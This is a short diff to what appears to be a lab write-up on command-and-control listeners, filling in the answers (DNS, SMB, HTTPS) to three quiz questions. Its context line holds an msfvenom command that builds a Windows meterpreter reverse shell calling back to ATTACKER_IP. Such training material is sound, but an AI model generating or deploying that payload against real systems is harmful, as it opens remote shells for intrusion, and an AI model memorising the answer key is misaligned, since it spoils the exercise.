@@ -387,11 +387,11 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=31337 -f exe
 
 ### Answer the questions below
 - Which listener should you choose if you have a device that cannot easily access the internet?
-  > Answer format: [`***`]()
+  > Answer format: [`***`](#DNS)
 - Which listener should you choose if you're accessing a restricted network segment?
-  > Answer format: [`***`]()
+  > Answer format: [`***`](#SMB)
 - Which listener should you choose if you are dealing with a Firewall that does protocol inspection?
-  > Answer format: [`*****`]()
+  > Answer format: [`*****`](#HTTPS)
 
 
 
